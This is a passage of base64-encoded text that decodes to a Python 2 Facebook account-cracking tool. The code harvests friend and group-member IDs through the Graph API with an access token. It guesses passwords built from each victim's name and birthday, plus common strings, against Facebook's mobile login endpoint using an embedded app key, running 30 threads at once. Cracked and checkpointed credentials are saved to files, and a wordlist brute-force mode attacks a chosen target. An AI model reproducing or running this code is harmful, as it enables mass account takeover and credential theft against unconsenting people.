kKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5NW3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Nm0xLlwwMzNbMTs5M20gQ3JhY2sgd2l0aCBsaXN0IGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTVt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTZtMi5cMDMzWzE7OTNtIENyYWNrIGZyb20gZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5NW3ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Nm0zLlwwMzNbMTs5M20gQ3JhY2sgZnJvbSBtZW1iZXIgZ3JvdXAiCglwcmludCAiXDAzM1sxOzk1beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzk2bTAuXDAzM1sxOzkzbSBCYWNrIgoJcHJpbnQgIuKVkSIKCXBpbGloX3N1cGVyKCkKCmRlZiBwaWxpaF9zdXBlcigpOgoJcGVhayA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1FbnRlciBcMDMzWzE7OTdtIikKCWlmIHBlYWsgPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQlwaWxpaF9zdXBlcigpCgllbGlmIHBlYWsgPT0iMSI6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCWphbGFuKCdcMDMzWzE7OTRtW+Kcul0gXDAzM1sxOzk2bUdldCBhbGwgZnJpZW5kIGlkIFwwMzNbMTs5NW0uLi4nKQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQoJCWZvciBzIGluIHpbJ2RhdGEnXToKCQkJaWQuYXBwZW5kKHNbJ2lkJ10pCgllbGlmIHBlYWsgPT0iMiI6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCWlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZnJpZW5kIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJCXRyeToKCQkJam9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQlvcCA9IGpzb24ubG9hZHMoam9rLnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK29wWyJuYW1lIl0KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJc3VwZXIoKQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgaWQgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgkJciA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIi9mcmllbmRzP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkKCQlmb3IgaSBpbiB6WydkYXRhJ106CgkJCWlkLmFwcGVuZChpWydpZCddKQoJZWxpZiBwZWFrID09IjMiOgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlpZGc9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCQl0cnk6CgkJCXI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZGcrJyZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiCgkJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJCXN1cGVyKCkKCQlqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgZ3JvdXAgbWVtYmVyIGlkIFwwMzNbMTs5N20uLi4nKQoJCXJlPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZGcrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlzPWpzb24ubG9hZHMocmUudGV4dCkKCQlmb3IgcCBpbiBzWydkYXRhJ106CgkJCWlkLmFwcGVuZChwWydpZCddKQoJZWxpZiBwZWFrID09IjAiOgoJCW1lbnVfaGFjaygpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0IgoJCXBpbGloX3N1cGVyKCkKCQkKCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBJRCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKGlkKSkKCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJdGl0aWsgPSBbJy4gICAnLCcuLiAgJywnLi4uICddCglmb3IgbyBpbiB0aXRpazoKCQlwcmludCgiXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inLhcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQ3JhY2sgXDAzM1sxOzk3bSIrbyksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpCglwcmludAoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkKCQkJCgkjIyMjIyBjcmFjayAjIyMjIwoJZGVmIG1haW4oYXJnKToKCQlnbG9iYWwgY2VrcG9pbnQsb2tzCgkJdXNlciA9IGFyZwoJCXRyeToKCQkJb3MubWtkaXIoJ291dCcpCgkJZXhjZXB0IE9TRXJyb3I6CgkJCXBhc3MKCQl0cnk6CgkJCSNQYXNzMQoJCQlhID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK3VzZXIrJy8/YWNjZXNzX3Rva2VuPScrdG9rZXQpCgkJCWIgPSBqc29uLmxvYWRzKGEudGV4dCkKCQkJcGFzczEgPSBiWydmaXJzdF9uYW1lJ10rJzEyMycKCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczEpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQlxID0ganNvbi5sb2FkKGRhdGEpCgkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CgkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkKCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCXByaW50KCJcMDMzWzE7OTNtWyBcMDMzWzE7OTNtT0vinJNcMDMzWzE7OTNtIF0gIit1c2VyKyIg8J+YgSAiICtwYXNzMSsiID0+Iit6WyduYW1lJ10pCgkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczEpCgkJCWVsc2U6CgkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJY2VrID0gb3Blbigib3V0L3N1cGVyX2NwLnR4dCIsICJhIikKCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczErIlxuIikKCQkJCQljZWsuY2xvc2UoKQoJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MxKQoJCQkJZWxzZToKCQkJCQkjUGFzczIKCQkJCQlwYXNzMiA9IGJbJ2ZpcnN0X25hbWUnXSsnMTIzNDUnCgkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczIpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgoJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkKCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQlwcmludCgiXDAzM1sxOzkzbVsgXDAzM1sxOzkzbU9L4pyTXDAzM1sxOzkzbSBdICIrdXNlcisiIPCfmIEgIiArcGFzczIrIiA9PiIrelsnbmFtZSddKQoJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczIpCgkJCQkJZWxzZToKCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCQkJY2VrID0gb3Blbigib3V0L3N1cGVyX2NwLnR4dCIsICJhIikKCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzMisiXG4iKQoJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MyKQoJCQkJCQllbHNlOgoJCQkJCQkJI1Bhc3MzCgkJCQkJCQlwYXNzMyA9IGJbJ2xhc3RfbmFtZSddICsgJzEyMycKCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MzKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikKCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CgkJCQkJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pCgkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQkJCXByaW50KCJcMDMzWzE7OTNtWyBcMDMzWzE7OTNtT0vinJNcMDMzWzE7OTNtIF0gIit1c2VyKyIg8J+YgSAiICtwYXNzMysiID0+Iit6WyduYW1lJ10pCgkJCQkJCQkJb2tzLmFwcGVuZCh1c2VyK3Bhc3MzKQoJCQkJCQkJZWxzZToKCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCWNlayA9IG9wZW4oIm91dC9zdXBlcl9jcC50eHQiLCAiYSIpCgkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzMysiXG4iKQoJCQkJCQkJCQljZWsuY2xvc2UoKQoJCQkJCQkJCQljZWtwb2ludC5hcHBlbmQodXNlcitwYXNzMykKCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkjUGFzczQKCQkJCQkJCQkJbGFoaXIgPSBiWycwOTg3NiddCgkJCQkJCQkJCXBhc3M0ID0gbGFoaXIucmVwbGFjZSgnLycsICcnKQoJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQkJCQkJcHJpbnQoIlwwMzNbMTs5M21bIFwwMzNbMTs5M21PS+Kck1wwMzNbMTs5M20gXSAiK3VzZXIrIiDwn5iBICIgK3Bhc3M0KyIgPT4iK3pbJ25hbWUnXSkKCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNCkKCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNCsiXG4iKQoJCQkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczQpCgkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCSNQYXNzNQoJCQkJCQkJCQkJCXBhc3M1ID0gInF3ZXJ0eTEyMyIKCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNSkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJcSA9IGpzb24ubG9hZChkYXRhKQoJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CgkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCQkJCQkJCQkJCXByaW50KCJcMDMzWzE7OTNtWyBcMDMzWzE7OTNtT0vinJNcMDMzWzE7OTNtIF0gIit1c2VyKyIg8J+YgSAiICtwYXNzNSsiID0+Iit6WyduYW1lJ10pCgkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNSkKCQkJCQkJCQkJCQllbHNlOgoJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06CgkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3M1KyJcbiIpCgkJCQkJCQkJCQkJCQljZWsuY2xvc2UoKQoJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczUpCgkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkjUGFzczYKCQkJCQkJCQkJCQkJCXBhc3M2ID0gIjEyMzQ1NjciCgkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNikrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpCgkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgoJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJCQkJCQkJCQkJCQlwcmludCgiXDAzM1sxOzkzbVsgXDAzM1sxOzkzbU9L4pyTXDAzM1sxOzkzbSBdICIrdXNlcisiIPCfmIEgIiArcGFzczYrIiA9PiIrelsnbmFtZSddKQoJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNikKCQkJCQkJCQkJCQkJCWVsc2U6CgkJCQkJCQkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOgoJCQkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJCQljZWsud3JpdGUodXNlcisifCIrcGFzczYrIlxuIikKCQkJCQkJCQkJCQkJCQkJY2VrLmNsb3NlKCkKCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczYpCgkJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQkJI1Bhc3M3CgkJCQkJCQkJCQkJCQkJCWEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisnLz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQkJCQkJCQkJCQkJCQkJYiA9IGpzb24ubG9hZHMoYS50ZXh0KQoJCQkJCQkJCQkJCQkJCQlwYXNzNyA9IGJbJ2ZpcnN0X25hbWUnXSsnMzIxJwoJCQkJCQkJCQkJCQkJCQlkYXRhID0gdXJsbGliLnVybG9wZW4oImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VyKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzNykrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIpCgkJCQkJCQkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkKCQkJCQkJCQkJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKCQkJCQkJCQkJCQkJCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcisiP2FjY2Vzc190b2tlbj0iK3FbJ2FjY2Vzc190b2tlbiddKQoJCQkJCQkJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQkJCQkJCQkJCQkJCQkJcHJpbnQoIlwwMzNbMTs5M21bIFwwMzNbMTs5M21PS+Kck1wwMzNbMTs5M20gXSAiK3VzZXIrIiDwn5iBICIgK3Bhc3M3KyIgPT4iK3pbJ25hbWUnXSkKCQkJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNykKCQkJCQkJCQkJCQkJCQkJZWxzZToKCQkJCQkJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToKCQkJCQkJCQkJCQkJCQkJCQljZWsgPSBvcGVuKCJvdXQvc3VwZXJfY3AudHh0IiwgImEiKQoJCQkJCQkJCQkJCQkJCQkJCWNlay53cml0ZSh1c2VyKyJ8IitwYXNzNysiXG4iKQoJCQkJCQkJCQkJCQkJCQkJCWNlay5jbG9zZSgpCgkJCQkJCQkJCQkJCQkJCQkJY2VrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczcpCgkJCQkJCQkJCQkJCQkJCQkJCgkJCQkJCQkJCQkJCQkJCQoJCWV4Y2VwdDoKCQkJcGFzcwoJCQoJcCA9IFRocmVhZFBvb2woMzApCglwLm1hcChtYWluLCBpZCkKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQgJ1wwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Eb25lIFwwMzNbMTs5N20uLi4uJwoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgT0svQ1AgXDAzM1sxOzkxbTogXDAzM1sxOzkybSIrc3RyKGxlbihva3MpKSsiXDAzM1sxOzk3bS9cMDMzWzE7OTNtIitzdHIobGVuKGNla3BvaW50KSkKCXByaW50KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1DUCBGaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvc3VwZXJfY3AudHh0IikKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCglzdXBlcigpCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKIyMjIyMgQlJVVEUgRk9SQ0UgIyMjIyMKZGVmIGJydXRlKCk6CglnbG9iYWwgdG9rZXQKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJdHJ5OgoJCWVtYWlsID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JRFwwMzNbMTs5N20vXDAzM1sxOzkybUVtYWlsXDAzM1sxOzk3bS9cMDMzWzE7OTJtSHAgXDAzM1sxOzk3bVRhcmdldCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCQlwYXNzdyA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtV29yZGxpc3QgXDAzM1sxOzk3bWV4dChsaXN0LnR4dCkgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpCgkJdG90YWwgPSBvcGVuKHBhc3N3LCJyIikKCQl0b3RhbCA9IHRvdGFsLnJlYWRsaW5lcygpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVRhcmdldCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitlbWFpbAoJCXByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbFwwMzNbMTs5Nm0gIitzdHIobGVuKHRvdGFsKSkrIiBcMDMzWzE7OTJtUGFzc3dvcmQiCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpCgkJc2FuZGkgPSBvcGVuKHBhc3N3LCJyIikKCQlmb3IgcHcgaW4gc2FuZGk6CgkJCXRyeToKCQkJCXB3ID0gcHcucmVwbGFjZSgiXG4iLCIiKQoJCQkJc3lzLnN0ZG91dC53cml0ZSgiXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inLhcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQ3JhY2sgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIrcHcpCgkJCQlzeXMuc3Rkb3V0LmZsdXNoKCkKCQkJCWRhdGEgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyhlbWFpbCkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocHcpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQoJCQkJbXBzaCA9IGpzb24ubG9hZHMoZGF0YS50ZXh0KQoJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gbXBzaDoKCQkJCQlkYXBhdCA9IG9wZW4oIkJydXRlLnR4dCIsICJ3IikKCQkJCQlkYXBhdC53cml0ZShlbWFpbCsiIHwgIitwdysiXG4iKQoJCQkJCWRhcGF0LmNsb3NlKCkKCQkJCQlwcmludCAiXG5cMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gb3VuZCIKCQkJCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQkJCQlwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1Vc2VybmFtZSBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitlbWFpbCkKCQkJCQlwcmludCgiXDAzM1sxOzkxbVvinrldIFwwMzNbMTs5Mm1QYXNzd29yZCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIitwdykKCQkJCQlrZWx1YXIoKQoJCQkJZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gbXBzaFsiZXJyb3JfbXNnIl06CgkJCQkJY2VrcyA9IG9wZW4oIkJydXRlY